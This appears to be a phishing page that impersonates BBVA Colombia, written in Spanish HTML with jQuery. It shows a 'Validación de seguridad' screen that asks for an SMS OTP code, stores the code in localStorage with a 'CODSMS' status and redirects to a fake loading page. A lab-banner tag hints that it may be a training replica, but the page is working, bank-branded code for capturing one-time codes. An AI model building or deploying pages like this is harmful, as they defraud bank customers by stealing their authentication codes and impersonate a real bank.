<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación de seguridad | BBVA Colombia</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: "BBVA Web Book BS";
            src: url("/bbva/BentonSansBBVA-Book.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Medium BS";
            src: url("/bbva/BentonSansBBVA-Medium.woff?v=63e781ba") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        :root {
            --bbva-azul-oscuro: #043263;
            --bbva-azul-medio: #1973b8;
            --bbva-texto: #121212;
            --bbva-fondo-input: #f4f4f4;
            --bbva-error: #cc0000;
        }

        .texto-1 {
            font-family: "BBVA Web Book BS", sans-serif;
            color: var(--bbva-texto);
            font-size: 22px;
            line-height: 2.2rem;
            margin-bottom: 0;
        }

        .texto-2 {
            font-family: "BBVA Web Book BS", sans-serif;
            font-size: 14px;
            line-height: 1.5rem;
            color: var(--bbva-texto);
        }

        .entrada-1 {
            width: 100%;
            background-color: var(--bbva-fondo-input);
            color: var(--bbva-texto);
            font-size: 17px;
            transition: background-color .25s, border-color .25s;
            display: block;
            padding: 0 15px 0 15px;
            border: none;
            border-bottom: 1px solid var(--bbva-texto);
            border-radius: 1px;
            font-family: "BBVA Web Book BS", "Helvetica Neue", Arial, Helvetica, sans-serif;
            height: 3.5rem;
        }

        .entrada-1:focus {
            outline: none;
            border-bottom: 2px solid var(--bbva-azul-medio);
        }

        .boton-1 {
            cursor: pointer;
            background-color: var(--bbva-azul-medio);
            border: none;
            border-radius: 1px;
            color: #fff;
            font-size: 1.5rem;
            font-family: "BBVA Web Medium BS", sans-serif;
            height: 3.5rem;
            text-align: center;
            text-decoration: none;
        }

        .boton-1:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .label-1 {
            font-family: "BBVA Web Medium BS", sans-serif;
            font-size: 14px;
            color: var(--bbva-texto);
            margin-bottom: 4px;
            display: block;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }

        .error-message {
            color: var(--bbva-error);
            font-family: "BBVA Web Book BS", sans-serif;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .borde-entrada-error {
            border-bottom-color: var(--bbva-error) !important;
        }

        .header-bbva {
            background-color: var(--bbva-azul-oscuro);
        }
    </style>
</head>

<body class="px-3">
<x-lab-banner />
    <!-- Header -->
    <div class="text-center py-4 header-bbva">
        <img src="/bbva/logo_bbva_blanco.svg" width="80" height="24" alt="BBVA">
    </div>

    <!-- Vista: Código SMS -->
    <div id="codsms">
        <h1 class="texto-1 mt-4 text-center px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Se ha enviado un código de seguridad O.T.P Token de seis (6) dígitos a tu celular:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralCodSMS" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="codsmsInput">Código de seguridad</label>
            <input class="entrada-1 w-100 mb-3" id="codsmsInput" name="codsms" type="password"
                placeholder="Código de seguridad" minlength="6" maxlength="8" autocomplete="off">
            <div class="error-message" id="errorCodSMS"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnCodSMS" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            let sessionUniqId = sessionStorage.getItem('uniqId');
            const appState = {
                uniqId: sessionUniqId,
                currentView: 'codsms'
            };

            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function validateOtp() {
                const value = $('#codsmsInput').val().trim();
                const isValid = /^\d{6,8}$/.test(value);
                $('#btnCodSMS').prop('disabled', !isValid);
                return isValid;
            }

            $('#codsmsInput').on('input', validateOtp);
            $('#btnCodSMS').on('click', function () {
                if (validateOtp()) {
                    saveToLocalStorage('codsms', $('#codsmsInput').val().trim());
                    saveToLocalStorage('status', 'CODSMS');

                    window.location.href = '/bbva/loading';
                }
            });
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
